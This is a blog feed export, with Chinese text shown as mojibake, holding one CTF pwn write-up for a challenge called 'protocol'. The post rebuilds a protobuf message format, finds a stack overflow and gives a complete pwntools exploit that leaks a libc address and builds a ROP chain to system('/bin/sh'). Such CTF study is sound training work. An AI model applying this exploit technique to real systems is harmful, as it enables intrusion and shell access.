{
    "version": "https://jsonfeed.org/version/1",
    "title": "null â€¢ All posts by \"æ ˆåŠ«æŒ\" tag",
    "description": "æ¬¢è¿æ¥åˆ°Huançš„ç¬”è®°ç©ºé—´~~~~~~ğŸŒ¸",
    "home_page_url": "https://yhuanhuan01.github.io",
    "items": [
        {
            "id": "https://yhuanhuan01.github.io/2024/06/28/protocol%E5%AD%A6%E4%B9%A0/",
            "url": "https://yhuanhuan01.github.io/2024/06/28/protocol%E5%AD%A6%E4%B9%A0/",
            "title": "protocolå­¦ä¹ ",
            "date_published": "2024-06-28T03:10:40.000Z",
            "content_html": "<h1 id=\"protocol\"><a class=\"markdownIt-Anchor\" href=\"#protocol\">#</a> protocol</h1>\n<blockquote>\n<p>å‰è¨€ï¼š</p>\n<p>åä¸­èµ›åŒºé¢˜ç›®ï¼Œç¬¬ä¸€æ¬¡ï¼Œç”±æ­¤è®°å½•ä¸€ä¸‹</p>\n</blockquote>\n<p>æ–‡æ¡£ï¼š<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wcm90b2J1Zi5kZXYvb3ZlcnZpZXcv\">https://protobuf.dev/overview/</span></p>\n<p>å¦‚ä½•å»è¿˜åŸæ­¤ç»“æ„ï¼š</p>\n<p>æˆ‘çš„æ–¹æ¡ˆå¦‚ä¸‹</p>\n<blockquote>\n<p>git clone <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21hcmluLW0vcGJ0ay5naXQ=\">https://github.com/marin-m/pbtk.git</span></p>\n<p>sudo apt install protobuf-compiler</p>\n</blockquote>\n<p>å…ˆè¿›è¡Œå¿…è¦çš„å®‰è£…é…ç½®</p>\n<p>æ¥ä¸‹æ¥å»ç”Ÿæˆå¯¼å…¥çš„ py åŒ…</p>\n<blockquote>\n<p>./extractors/from_binary.py ./pwn</p>\n<p>protoc --python_out=. ./filename.proto</p>\n</blockquote>\n<p><img data-src=\"/img/protocol/image-20240628092648137.png\" alt=\"image-20240628092648137\"></p>\n<p>å³å¯å¾—åˆ°ä¸Šé¢æ–‡ä»¶</p>\n<h2 id=\"é¢˜ç›®å¯åŠ¨\"><a class=\"markdownIt-Anchor\" href=\"#é¢˜ç›®å¯åŠ¨\">#</a> é¢˜ç›®å¯åŠ¨</h2>\n<h3 id=\"æ£€æŸ¥ä¿æŠ¤\"><a class=\"markdownIt-Anchor\" href=\"#æ£€æŸ¥ä¿æŠ¤\">#</a> æ£€æŸ¥ä¿æŠ¤</h3>\n<p><img data-src=\"/img/protocol/image-20240628093304459.png\" alt=\"image-20240628093304459\"></p>\n<p>è¿è¡Œä¸€æ³¢ç¨‹åºçœ‹çœ‹å’‹æ ·</p>\n<p><img data-src=\"/img/protocol/image-20240628093431819.png\" alt=\"image-20240628093431819\"></p>\n<h3 id=\"æµ‹è¯•\"><a class=\"markdownIt-Anchor\" href=\"#æµ‹è¯•\">#</a> æµ‹è¯•</h3>\n<p>è¾“å…¥ä¼šè¾“å‡ºè¿™ä¸ªï¼Œå»å®šä½ä¸€ä¸‹</p>\n<p><img data-src=\"/img/protocol/image-20240628093536176.png\" alt=\"image-20240628093536176\"></p>\n<p>if åˆ¤æ–­ v5 æ˜¯å¦è¿”å› 1ï¼Œè¿”å› 0 åˆ™ä¼šè¾“å‡º <code>Protobuf Parse Error!</code></p>\n<p><img data-src=\"/img/protocol/image-20240628093750454.png\" alt=\"image-20240628093750454\"></p>\n<p>å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬ v6 å‘ s æ‰€åœ¨åœ°å€å»è¾“å…¥ï¼Œè€Œ v5 æ‰€æŒ‡å‘çš„å‡½æ•°åº”è¯¥æ˜¯æ£€æµ‹ s åœ°å€å†…å®¹çš„å‡½æ•°</p>\n<p>GPT è§£é‡Šå¦‚ä¸‹</p>\n<p><code>google::protobuf::MessageLite::ParseFromArray</code>  æ˜¯ Google Protocol Buffers (protobuf) åº“ä¸­ç”¨äºè§£æäºŒè¿›åˆ¶æ•°æ®çš„æ–¹æ³•ã€‚å®ƒä»ç»™å®šçš„å­—èŠ‚æ•°ç»„ä¸­è§£ææ•°æ®å¹¶å°†å…¶å¡«å……åˆ°ç›¸åº”çš„ protobuf æ¶ˆæ¯ä¸­ã€‚</p>\n<p>è®©æˆ‘ä»¬åˆ†è§£ä¸€ä¸‹è¿™ä¸ªå‡½æ•°è°ƒç”¨ï¼š</p>\n<pre><code class=\"language-c++\">google::protobuf::MessageLite::ParseFromArray((google::protobuf::MessageLite *)&amp;unk_209080, s, v6);\n</code></pre>\n<ul>\n<li>\n<p><code>google::protobuf::MessageLite</code>  æ˜¯ä¸€ä¸ªæŠ½è±¡åŸºç±»ï¼Œå®ƒå®šä¹‰äº†æ‰€æœ‰ protobuf æ¶ˆæ¯çš„åŸºæœ¬æ¥å£å’Œæ“ä½œã€‚ <code>ParseFromArray</code>  æ˜¯è¿™ä¸ªç±»ä¸­çš„ä¸€ä¸ªæˆå‘˜å‡½æ•°ã€‚</p>\n</li>\n<li>\n<p><code>ParseFromArray</code>  å‡½æ•°çš„ç­¾åé€šå¸¸æ˜¯è¿™æ ·çš„ï¼š</p>\n<pre><code class=\"language-c++\">bool ParseFromArray(const void* data, int size);\n</code></pre>\n<p>å®ƒä»ä¸€ä¸ªç»™å®šå¤§å°çš„å­—èŠ‚æ•°ç»„ ( <code>data</code>  å¼€å§‹ï¼Œå¤§å°ä¸º  <code>size</code> ) ä¸­è§£æ protobuf æ¶ˆæ¯ã€‚</p>\n</li>\n<li>\n<p>åœ¨è¿™ä¸ªè°ƒç”¨ä¸­ï¼š</p>\n<ul>\n<li><code>(google::protobuf::MessageLite *)&amp;unk_209080</code>  æ˜¯ä¸€ä¸ªæŒ‡å‘  <code>google::protobuf::MessageLite</code>  æ´¾ç”Ÿç±»å®ä¾‹çš„æŒ‡é’ˆï¼Œè¡¨ç¤ºè¦å°†è§£æå¾—åˆ°çš„æ•°æ®å¡«å……åˆ°  <code>unk_209080</code>  å¯¹è±¡ä¸­ã€‚</li>\n<li><code>s</code>  æ˜¯ä¸€ä¸ªæŒ‡å‘å­—èŠ‚æ•°ç»„çš„æŒ‡é’ˆï¼Œè¡¨ç¤ºæ•°æ®æ¥æºã€‚</li>\n<li><code>v6</code>  æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºå­—èŠ‚æ•°ç»„çš„å¤§å°ï¼ˆå³  <code>s</code>  çš„é•¿åº¦ï¼‰ã€‚</li>\n</ul>\n</li>\n</ul>\n<p>æ¢å¥è¯è¯´ï¼Œè¿™ä¸ªå‡½æ•°è°ƒç”¨è¯•å›¾ä»å­—èŠ‚æ•°ç»„  <code>s</code>  ä¸­è¯»å–  <code>v6</code>  ä¸ªå­—èŠ‚ï¼Œå¹¶å°†è§£æå¾—åˆ°çš„æ¶ˆæ¯å­˜å‚¨åˆ°  <code>unk_209080</code>  å¯¹è±¡ä¸­ã€‚</p>\n<p>å¦‚æœè§£ææˆåŠŸï¼Œ <code>ParseFromArray</code>  å°†è¿”å›  <code>true</code> ï¼›å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å›  <code>false</code> ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œå¤±è´¥çš„åŸå› å¯èƒ½åŒ…æ‹¬æ•°æ®æ ¼å¼ä¸æ­£ç¡®æˆ–æ•°ç»„é•¿åº¦ä¸å¤Ÿç­‰ã€‚</p>\n<p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬è§£æå¤±è´¥åˆ™ä¸å»å¾€ä¸‹å»æ‰§è¡Œ</p>\n<p>unk_209080 å¡«å……æ•°æ®åœ°æ–¹åªæœ‰ 1bit å¤§å°ç©ºé—´</p>\n<p><img data-src=\"/img/protocol/image-20240628095136822.png\" alt=\"image-20240628095136822\"></p>\n<p>æˆ‘ä»¬å¾ˆéš¾è¿›è¡Œè‡ªå·±å»è¾“å…¥æµ‹è¯•</p>\n<p>çœ‹ä¸‹ç»“æ„ä½“</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>message protoMessage <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    optional string name <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    optional string phoneNumber <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    required <span class=\"token builtin\">bytes</span> <span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    required uint32 size <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>optional å¯é€‰é¡¹</p>\n<p>required éœ€è¦å†™å…¥</p>\n<blockquote>\n<p>å°è£…å‡½æ•°</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">send_payload</span><span class=\"token punctuation\">(</span> buf<span class=\"token punctuation\">,</span> szie<span class=\"token punctuation\">,</span> name <span class=\"token operator\">=</span> <span class=\"token string\">b'name'</span><span class=\"token punctuation\">,</span> phoneNumber <span class=\"token operator\">=</span> <span class=\"token string\">b'phoneNumber'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tpl <span class=\"token operator\">=</span> message_pb2<span class=\"token punctuation\">.</span>protoMessage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span><span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">return</span> pl<span class=\"token punctuation\">.</span>SerializeToString<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> message_pb2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>message protoMessage &#123;</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    optional string name = 1;</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    optional string phoneNumber = 2;</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    required bytes buffer = 3;</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    required uint32 size = 4;</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">set_payload</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> szie<span class=\"token punctuation\">,</span> name <span class=\"token operator\">=</span> <span class=\"token string\">b'name'</span><span class=\"token punctuation\">,</span> phoneNumber <span class=\"token operator\">=</span> <span class=\"token string\">b'phoneNumber'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tpl <span class=\"token operator\">=</span> message_pb2<span class=\"token punctuation\">.</span>protoMessage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>phoneNumber <span class=\"token operator\">=</span> phoneNumber</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span><span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token keyword\">return</span> pl<span class=\"token punctuation\">.</span>SerializeToString<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token string\">b'aaaa'</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>size <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>payload <span class=\"token operator\">=</span> set_payload<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/protocol/image-20240628102847682.png\" alt=\"image-20240628102847682\"></p>\n<p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æˆåŠŸçš„å»æ‰§è¡Œäº†</p>\n<h3 id=\"å¯»æ‰¾æ¼æ´\"><a class=\"markdownIt-Anchor\" href=\"#å¯»æ‰¾æ¼æ´\">#</a> å¯»æ‰¾æ¼æ´</h3>\n<p><img data-src=\"/img/protocol/image-20240628103148873.png\" alt=\"image-20240628103148873\"></p>\n<p>n [0] æ˜¯æˆ‘ä»¬è¾“å…¥ buf çš„å¤§å°ï¼Œn [1] æ˜¯æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ã€‚è€Œå‰é¢å¯ä»¥è®¾ç½®æœ€å¤§ä¸º 0x1000 å¾ˆæ˜æ˜¾æœ‰æ ˆæº¢å‡ºæ¼æ´ã€‚</p>\n<p>ç»™å‡ºç»™çš„ puts å‡½æ•°çš„åœ°å€ï¼Œæ„é€ åˆç†çš„ rop æˆ–è€… one_gadgetï¼ˆåæ¥å‘ç° one_gadget æ²¡æœ‰ç›¸åº”çš„æ¡ä»¶</p>\n<p>å®Œæ•´ exp å¦‚ä¸‹</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> message_pb2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">set_payload</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> szie<span class=\"token punctuation\">,</span> name <span class=\"token operator\">=</span> <span class=\"token string\">b'name'</span><span class=\"token punctuation\">,</span> phoneNumber <span class=\"token operator\">=</span> <span class=\"token string\">b'phoneNumber'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tpl <span class=\"token operator\">=</span> message_pb2<span class=\"token punctuation\">.</span>protoMessage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>phoneNumber <span class=\"token operator\">=</span> phoneNumber</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span><span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tpl<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token keyword\">return</span> pl<span class=\"token punctuation\">.</span>SerializeToString<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tgdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tpause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>message protoMessage &#123;</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    optional string name = 1;</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    optional string phoneNumber = 2;</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    required bytes buffer = 3;</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    required uint32 size = 4;</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Gift: 0x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>puts_libc <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvn<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>libcbase <span class=\"token operator\">=</span> puts_libc <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libcbase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>system <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>binsh <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rdi <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000002164f</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>ret <span class=\"token operator\">=</span> rdi <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>ogg <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x4f29e</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4f2a5</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4f302</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x10a2fc</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>og <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> ogg<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x218</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>size <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>payload <span class=\"token operator\">=</span> set_payload<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "æ ˆåŠ«æŒ",
                "protocol"
            ]
        }
    ]
}